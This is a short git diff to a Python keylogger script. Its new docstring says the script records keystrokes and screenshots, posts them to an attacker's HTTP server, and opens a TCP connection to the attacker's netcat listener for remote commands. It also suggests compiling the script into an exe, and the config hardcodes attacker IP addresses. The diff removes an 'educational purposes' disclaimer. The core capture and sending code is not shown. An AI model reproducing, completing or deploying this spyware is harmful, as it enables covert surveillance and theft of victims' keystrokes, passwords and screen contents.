@@ -12,10 +12,9 @@ from os.path import exists
 from os import remove
 from pynput import keyboard
 
-"""Note that this is just a proof of concept and is only for educational purposes.
-   I am not responsible for any of your actions.
-
-   SELF NOTE : Work on attacker interface!!
+"""This simple python script is able to log keystrokes,take screenshots and send all of that through a POST request to a properly configured HTTP. Moreover, 
+upon running this script, two tcp connections are initiated. One to the attacker's machine on a specififc port which he/she is listening on(e.g using netcat), 
+and the second one to the HTTP server(I used NGINX). The keystrokes and screenshot images are saved to a file on the server. Furthermore these files can be served throught the web browser where the attacker can view them(Maybe serve it through localhost if HTTP server is on the same machine). The other connection is used by the attacker to send predefined command, see commands.txt or even better just look at the source code. Feel free to change the necessary variables such as PORT and HOST. You can compile the source code into exe file [here](https://pyinstaller.org/).
 """
 
 
@@ -26,6 +25,7 @@ __add_data = ""
 #Hardcoded values
 HOST="192.168.100.176"
 HTTP_PORT = 5000
+
 URL = "http://192.168.100.175"
 URI = "index.php"
 URI_IMAGE = "image.php"
